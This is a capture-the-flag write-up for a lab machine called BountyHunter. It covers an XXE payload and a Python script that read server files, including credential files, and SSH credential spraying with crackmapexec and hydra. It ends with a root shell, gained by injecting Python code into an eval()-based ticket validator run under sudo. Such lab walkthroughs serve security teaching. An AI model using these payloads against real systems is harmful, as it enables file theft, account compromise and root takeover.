# @author : M3tr1c_r00t
## BountyHunter!
![BountyHunter](https://user-images.githubusercontent.com/99975622/204362290-57dd3f77-0c4a-4761-bcd4-76c1fa21dbdd.png)

### Enumeration...
So as always we start with an nmap scan.....
![Screenshot_2022-11-22_00_19_21](https://user-images.githubusercontent.com/99975622/204362544-3d1f83c2-e0c7-44fb-84d3-8e55aa21a597.png)
We can that there are 2 ports open.... ssh and port 80.

Gobusterscan
After running a gobuster scan,we find a couple of directories which we could check out...
![Screenshot_2022-11-22_00_19_11](https://user-images.githubusercontent.com/99975622/204362796-ae3b0889-5ed1-4685-a4be-0da476983f91.png)

### XXE Vulnerability
![image](https://user-images.githubusercontent.com/99975622/204363407-cb28d4a3-abf8-4cb9-be8f-9c392b877e56.png)
<br>After checking out the site, we find there's a submit page which sent data in form of a base64 encoded xml format.
After finding out about thid while using burpsuite, we can try using the basic xxe and we achieved Arbibrary file read....
On this same account, i made a python script which allows for file read and only outputs the file read contents....



```
You can take advantage of this XXE using the following in the request of the site in burpsuite; 

<?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///{test}'>]>
                <bugreport>
                <title>tester</title>
                <cwe>&test;</cwe>
                <cvss>10</cvss>
                <reward>5555</reward>
                </bugreport>

```
Checkout my Python script......
```
#!/usr/bin/python3
#@author: M3tr1c_r00t
import requests
import base64
import sys
import cmd

def getFile(fname):
	#fname = sys.argv[1]
	#fname = '/etc/passwd'
	payload=f"""<?xml  version="1.0" encoding="ISO-8859-1"?><!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={fname}"> ]>
		        <bugreport>
		        <title>tester</title>
		        <cwe>&xxe;</cwe>
		        <cvss>10</cvss>
		        <reward>5555</reward>
		        </bugreport>""".encode()


	payload_b64 = base64.b64encode(payload).decode()
	data = {"data": payload_b64}
	r = requests.post("http://10.129.114.104//tracker_diRbPr00f314.php", data=data)
  #change your ip in r!
	#output = r.text
	output = (r.text).split('>')[11:][:-4]
	#print(base64.b64decode(output).decode())
	conf = output[0].split("<")
	#print(bytes.decode(base64.b64decode(conf[0])))
	return bytes.decode(base64.b64decode(conf[0]))
	
	
	
class XxeLeak(cmd.Cmd):
	prompt = "M3tr1c_r00t> "
	def default(self,args):
		print(getFile(args))
XxeLeak().cmdloop()

```

In my script ive changed the XXE to php filter base64 encode because when you try to visit the /var/www/hmtl/index.php the output is nothing... ; and to fix that we use the php filter one.

After making the script, i ran gobuster once again but using the "-x php" to specify that we want to find php files...; and we get db.php

On viewing this file, we find some creds...
![Screenshot_2022-11-21_23_48_11](https://user-images.githubusercontent.com/99975622/204366691-dfddd8fb-5edd-4c36-9c6e-3eb6bc79f4de.png)

Next up, we use crackmapexec to bruteforce the creds to the specific users or you can also use hydra...

We get the users from the /etc/passwd file .....

```
Crackmapexec:
crackmapexec ssh 10.129.114.104 -u users.txt -p "m19RoAU0hP41A1sTsq6K"
Hydra:
hydra -L users.txt -P passwd.txt 10.10.14.62 -t 4 ssh
```
And we get creds!

We can now SSH into the machine!
![Screenshot_2022-11-21_23_50_20](https://user-images.githubusercontent.com/99975622/204367424-6f164a04-0e59-4410-8fe4-c40d7c5bce96.png)

On logging in, we find there's a file which we can execute by using python as sudo....
![Screenshot_2022-11-21_23_53_08](https://user-images.githubusercontent.com/99975622/204368205-c4f4b178-4c95-4e6d-84b9-72cb2edc3cd1.png)
But the bad news is that that script is read only.

Its a Ticket validator script ...

```
development@bountyhunter:~$ cat /opt/skytrain_inc/ticketValidator.py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

```
We can take advantage of this as the script reads the markdown files line by line and is vulnerable to code execution.

We can modify the markdown files and add some a bin bash to help as get bash as root.

```
# Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**32+110+43+ __import__('os').system('bash')**
##Issued: 2021/04/06
#End Ticket
```
This also works....
```
development@bountyhunter:~/tmp$ cat exp.md 
# Skytrain Inc   
## Ticket to root  
__Ticket Code:__  
**11+100==111 and exec("import pty; pty.spawn(\"/bin/sh\")")

```
And we are root!
Done!
### Socials
@Instagram:https://instagram.com/M3tr1c_r00t
<br>@Twitter:https://twitter.com/M3tr1c_root
